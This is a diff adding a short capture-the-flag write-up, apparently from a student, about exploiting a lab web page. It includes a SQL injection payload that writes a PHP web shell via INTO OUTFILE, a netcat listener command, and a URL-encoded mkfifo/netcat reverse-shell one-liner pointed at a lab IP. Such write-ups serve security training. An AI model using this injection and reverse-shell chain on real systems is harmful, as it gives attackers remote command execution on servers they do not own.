@@ -1,0 +1,10 @@
+flag{3b2000}: Start DATATIME: Sunday End DATATIME: Tuesday. Total time spend: 3h
+First of all I started visiting different websites to get in contact with sql and then tried some commands such as searching the different tables of the database. Then I realized 
+that I had to exploit the website to get the flag as the webpage has a vulnerability. I used vurhfio' UNION SELECT '', 2, 3, 4 INTO OUTFILE '/var/www/html/php/shell.php' -- '
+where UNION SELECT is used to combine the results of two SELECT statements. I used an empty string to match the number of columns in the target table.
+, 2, 3, 4: These numbers are added to match the number of columns in the target table. After that I saved into a php file doing INTO OUTFILE '/var/www/html/php/shell.php'.
+Now that I had the PHP file shell.php, I was able to command execution on the server. 
+After that I used a command to open a Netcat listener and make that connection between shells:
+nc -nlvp 4444
+Access the PHP file via the browser: 10.0.2.186/php/shell.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.0.3+4444+>/tmp/f and the puted flag also
+in the browser to get the final flag.
